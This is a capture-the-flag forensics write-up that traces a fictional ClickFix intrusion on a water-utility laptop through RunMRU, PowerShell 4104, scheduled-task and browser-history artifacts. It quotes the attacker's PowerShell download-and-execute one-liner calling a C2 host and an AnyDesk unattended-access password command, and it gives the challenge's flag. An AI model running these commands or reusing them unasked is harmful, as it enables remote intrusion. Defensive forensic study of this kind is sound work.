# CAPTCHA the Water Plant

> Forensics · Easy · Marius Merai  
> Points: 120 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}
```

**Challenge**

Nordvia Water Utility lost its distribution-control panel and pressure collapsed across the northern
districts. An administrator account was used from one of three laptops. The brief gives three KAPE triage
collections taken after the incident and asks us to follow the evidence through four stages: what the user
ran, what it launched, the persistence it left behind, and finally the browser evidence it exposed.

The three attachments (`ENG-LAPTOP-23.zip`, `FIELD-WKS-21.zip`, `OPS-NB-06.zip`) are KAPE *parsed* output
(`Kape-parsed-<HOST>/`), not raw artifacts. Each holds Eric Zimmerman tool CSVs (RECmd batch, EvtxECmd,
PECmd, MFTECmd, Amcache, AppCompatCache, SrumECmd, LECmd/JLECmd, SBECmd) plus a Hindsight `.xlsx` for the
Chromium-based browser (Microsoft Edge, from the profile paths). Only OPS-NB-06 also carries a
`Persistence/` folder. Because everything was already parsed, the job is correlating CSVs, not parsing raw
artifacts, and nothing had to be executed. The last three of the brief's four stages each yield one flag
fragment.

**Approach / walkthrough**

Triage routed the challenge to the forensics playbook and its engines (`windows.py`, `timeline.py`,
`sqlite_artifacts.py`). With pre-parsed CSVs the fastest route is plain text search over the extracted
collections, steered by the brief's four stages. All work was offline and static, on the supplied files
only; the fictional C2 host in the evidence was never contacted.

```sh
mkdir w && cd w && unzip -oq ../files/OPS-NB-06.zip -d ops   # repeat for the other two hosts
grep -rl zindetify ops    # C2 host appears only in OPS-NB-06
```

The C2 hostname `zindetify` appears in no file of the other two collections, so only OPS-NB-06 is analyzed
further.

*1. What the user ran (RunMRU).* The Win+R history lives in
`Registry/*_RECmd_Batch_RECmd_Batch_MC_Output.csv` (key `RunMRU(Start>Run)`). ENG-LAPTOP-23 has an empty
RunMRU; FIELD-WKS-21 (user `localuser`) holds only `calc`, `notepad`, `powershell`. OPS-NB-06 (user
`ops06.nwu`) has a single entry (`MRUList = a`), key last-written `2026-10-21 04:30:47`, a classic
ClickFix one-liner:

```
powershell.exe -nop  -ep Bypass "[System.Text.Encoding]::UTF8.GetString((New-Object System.Net.WebClient).DownloadData('http://zindetify.dev.boot:8080/validator')) | iex"
```

(The double space after `-nop` is in the stored value.) This identifies OPS-NB-06 as the compromised
laptop.

*2. What it launched (PowerShell 4104).* In `EventLogs/*_EvtxECmd_Output.csv`, Microsoft-Windows-
PowerShell/Operational event **4104** (script-block logging) captures the full fetched `/validator` payload
about three seconds after the RunMRU write. The script hides its logic behind 50 junk `Get-DataNN` padding
functions, then registers a daily scheduled task, downloads AnyDesk from `/tool` into
`C:\temp\Maitenance\`, installs it silently (`--start-with-win --silent`), and sets a fixed
unattended-access password:

```powershell
Start-Process --FilePath $InstalledExe -ArgumentList "--set-password `"f@k3_c@ptch@`""
```

(`--FilePath` with two dashes is as written in the evidence.) PECmd confirms
`\TEMP\MAITENANCE\SETUP\ANYDESK.EXE` executed. That AnyDesk password is **fragment 1: `f@k3_c@ptch@`**.

*3. Persistence (scheduled task).* TaskScheduler event **106** (task registered) records the task
`\Maitenance Check , ` (misspelling as in the evidence), user context `OPS-NB-06\ops06.nwu`. The payload
sets the task `-Description` from `Get-Data51`, which returns the content of `/config`.
`Persistence/Scheduled Tasks.csv` shows that value in the task's **Comment** column:

```
..."DownloadData('http://zindetify.dev.boot:8080/validator')) | iex","N/A","_r3@l_m@lw@r3","Enabled",...
```

**Fragment 2: `_r3@l_m@lw@r3`** — the leading underscore is part of the stored value. Event 200 shows
the task ran again at 2026-10-21 15:10:00, and 4104 logged the same payload a second time three seconds
later, confirming the task is the persistence mechanism rather than a one-off.

*4. Browser evidence (Hindsight).* On 2026-10-28, with AnyDesk running, 4104 and PECmd show the attacker's
hands-on session: downloading a NirSoft suite, then running `BROWSINGHISTORYVIEW.EXE` and
`WEBBROWSERPASSVIEW.EXE` to dump saved browser credentials. Shortly after that password dump,
`WebBrowsers/Hindsight_output.xlsx` (read by unzipping the xlsx and parsing `xl/sharedStrings.xml` and
`xl/worksheets/sheet1.xml`) records an Edge login as `admin` on the water utility's admin panel, followed
by a redirect to an admin dashboard:

```
2026-10-16 20:31:15  .../admin-dashboard?token=NVW-OPS-892-a7f39c2e
2026-10-21 04:31:31  .../admin-dashboard?token=NVW-OPS-739-a7f39c2e
2026-10-28 03:54:04  .../admin-dashboard?token=NVW-ADMIN-cl1ckf1xed
```

The two earlier `NVW-OPS-*` tokens belong to the operator's normal sessions (Login Data shows username
`ops06`). The `NVW-ADMIN-` token comes from the `admin` login that followed the credential dump, matching
the brief's "an administrator account was used." **Fragment 3: `cl1ckf1xed`**.

*5. Assemble.* Join the three fragments with `_`, in the brief's stage order. Fragment 2 already starts
with an underscore, so a single underscore separates each part:

```
CSCTF{f@k3_c@ptch@_r3@l_m@lw@r3_cl1ckf1xed}
```

The phrase reads "fake captcha, real malware, clickfixed," which supports and confirms the fragment order.

**Why it works**

This is the ClickFix ("fake CAPTCHA") pattern: a web page tells the victim to "verify they are human" by
pasting an attacker command into the Win+R Run dialog, which leaves a RunMRU registry entry. PowerShell
script-block logging (4104) preserves the full fetched script even though it was never written to disk, and
that script carries both the AnyDesk unattended-access password and the scheduled-task definition. The
attacker's later credential dump and admin login then surface in the Edge browser history that Hindsight
has already extracted. The brief's four stages map directly onto four KAPE artifact classes — RunMRU,
PowerShell 4104, Scheduled Tasks, Hindsight — and the ClickFix RunMRU entry rules out two of the three
laptops immediately.

**Validation / reproduction**

Each fragment came from a single field on which two artifacts agree: the scheduled task appears in both
event 106 and `Scheduled Tasks.csv`, and the admin login lines up with the `WEBBROWSERPASSVIEW.EXE` run in
the PECmd timeline. The joined phrase reads as English, which confirmed the ordering independently of the
submission.

Reproduction summary: unzip the three collections; `grep` for the C2 hostname to isolate OPS-NB-06; read
the RunMRU CSV for the ClickFix command; read the 4104 payload for the AnyDesk `--set-password` value
(fragment 1); read the `Scheduled Tasks.csv` Comment column for fragment 2; parse `Hindsight_output.xlsx`
for the `NVW-ADMIN-` token suffix (fragment 3); join with `_` in stage order.

Gotchas: the task name's characters after `Maitenance Check` render as ` , ` in event 106 but as `????` in
the schtasks CSV; the exact original bytes were not recovered and do not affect the flag. The `/config`
content is never read directly — that it equals `_r3@l_m@lw@r3` is inferred from `-Description
(Get-Data51)` together with the task's Comment field. The first two submissions returned `ratelimited`
because of team-wide pacing and were never judged; the same value was accepted on the third send.
